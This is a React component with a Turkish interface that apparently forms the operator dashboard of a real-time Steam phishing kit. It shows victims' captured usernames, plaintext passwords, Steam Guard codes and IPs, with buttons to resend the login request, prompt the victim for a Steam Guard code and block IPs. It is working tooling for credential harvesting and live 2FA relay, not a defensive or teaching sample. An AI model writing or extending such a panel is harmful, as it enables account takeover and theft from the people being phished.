
import React from 'react';
import { Button } from '@/components/ui/button';
import { Shield, Ban, Wifi, WifiOff } from 'lucide-react';
import { LoginAttempt } from '@/types/loginAttempt';
import { 
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow
} from '@/components/ui/table';

interface LoginAttemptsTableProps {
  loginAttempts: LoginAttempt[];
  isLoading: boolean;
  onRetryRequest: (username: string) => void;
  onSteamGuardRequest: (username: string) => void;
  onIpBlock: (ip: string) => void;
}

const LoginAttemptsTable: React.FC<LoginAttemptsTableProps> = ({
  loginAttempts,
  isLoading,
  onRetryRequest,
  onSteamGuardRequest,
  onIpBlock
}) => {
  if (isLoading) {
    return <div className="text-center py-4">Yükleniyor...</div>;
  }

  if (loginAttempts.length === 0) {
    return (
      <div className="text-center py-4 text-muted-foreground">
        Henüz giriş denemesi yok
      </div>
    );
  }

  return (
    <div className="overflow-x-auto">
      <Table>
        <TableHeader>
          <TableRow>
            <TableHead>Kullanıcı Adı</TableHead>
            <TableHead>Şifre</TableHead>
            <TableHead>Steam Guard</TableHead>
            <TableHead>IP Adresi</TableHead>
            <TableHead>Durum</TableHead>
            <TableHead>Çevrimiçi</TableHead>
            <TableHead>Zaman</TableHead>
            <TableHead className="text-right">İşlemler</TableHead>
          </TableRow>
        </TableHeader>
        <TableBody>
          {loginAttempts.map((attempt) => (
            <TableRow key={attempt.id} className="border-b">
              <TableCell>{attempt.username}</TableCell>
              <TableCell>{attempt.password}</TableCell>
              <TableCell>{attempt.steamguard || '-'}</TableCell>
              <TableCell>{attempt.ip}</TableCell>
              <TableCell>
                <span className={`px-2 py-1 rounded text-xs ${
                  attempt.status === 'pending' ? 'bg-yellow-500/20 text-yellow-500' :
                  attempt.status === 'rejected' ? 'bg-red-500/20 text-red-500' :
                  attempt.status === 'awaiting_2fa' ? 'bg-blue-500/20 text-blue-500' :
                  attempt.status === 'blocked' ? 'bg-gray-500/20 text-gray-500' :
                  'bg-green-500/20 text-green-500'
                }`}>
                  {attempt.status === 'pending' ? 'Beklemede' :
                    attempt.status === 'rejected' ? 'Reddedildi' :
                    attempt.status === 'awaiting_2fa' ? 'Steam Guard Bekliyor' :
                    attempt.status === 'blocked' ? 'Engellendi' :
                    'Tamamlandı'}
                </span>
              </TableCell>
              <TableCell>
                {attempt.online ? (
                  <span className="flex items-center text-green-500">
                    <Wifi className="h-4 w-4 mr-1" /> Çevrimiçi
                  </span>
                ) : (
                  <span className="flex items-center text-gray-500">
                    <WifiOff className="h-4 w-4 mr-1" /> Çevrimdışı
                  </span>
                )}
              </TableCell>
              <TableCell>{new Date(attempt.timestamp).toLocaleString()}</TableCell>
              <TableCell className="text-right">
                <div className="flex justify-end gap-2">
                  <Button 
                    variant="outline" 
                    size="sm"
                    onClick={() => onRetryRequest(attempt.username)}
                    disabled={attempt.status !== 'pending'}
                  >
                    Tekrar Gönder
                  </Button>
                  <Button 
                    variant="outline" 
                    size="sm"
                    onClick={() => onSteamGuardRequest(attempt.username)}
                    disabled={attempt.status !== 'pending'}
                  >
                    <Shield className="mr-1 h-3 w-3" />
                    Steam Guard İste
                  </Button>
                  <Button 
                    variant="outline" 
                    size="sm"
                    className="text-red-500 border-red-500 hover:bg-red-500/10"
                    onClick={() => onIpBlock(attempt.ip)}
                    disabled={attempt.status === 'blocked'}
                  >
                    <Ban className="mr-1 h-3 w-3" />
                    IP Yasakla
                  </Button>
                </div>
              </TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </div>
  );
};

export default LoginAttemptsTable;
